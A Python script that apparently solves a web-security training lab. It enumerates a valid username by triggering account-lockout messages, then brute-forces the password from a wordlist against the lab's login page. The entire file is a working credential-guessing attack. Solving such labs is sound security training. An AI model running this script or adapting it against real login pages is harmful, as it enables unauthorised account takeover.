import sys
import urllib
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

fs = open("Username.txt", "r")
fp = open("Password.txt", "r")

def main():
    url = "https://0ace0044039f5df3c01e288900aa0022.web-security-academy.net/login"
    username = ""
    fake = 0
    print("(+) Retrieving username...")
    
    for x in fs:
        username = x.strip("\n")
        fake += 1
        data = {"username": username, "password": "1234%s" % fake}
        for y in range(0, 4):
            requests.post(url, data=data)
        r = requests.post(url, data=data)
        if "Invalid" in r.text:
            sys.stdout.write(username)
            sys.stdout.write("\r")
            sys.stdout.flush
        else:
            print("Correct username: " + username)
            break
        
    fs.close()
    password = ""
    print("(+) Retrieving Password...")
    
    for z in fp:
        password = z.strip("\n")
        data = {"username": username, "password": password} 
        r = requests.post(url, data=data)
        # if r.status_code == 200:
        if "You have made too many incorrect login attempts" in r.text:
            sys.stdout.write(password)
            sys.stdout.write("\r")
            sys.stdout.flush
        else:
            print("Correct password: " + password) 
            break
    
    fp.close()
    print("Done!!!")
    print("Username: " + username)
    print("Password: " + password)      

if __name__ == "__main__":
    main()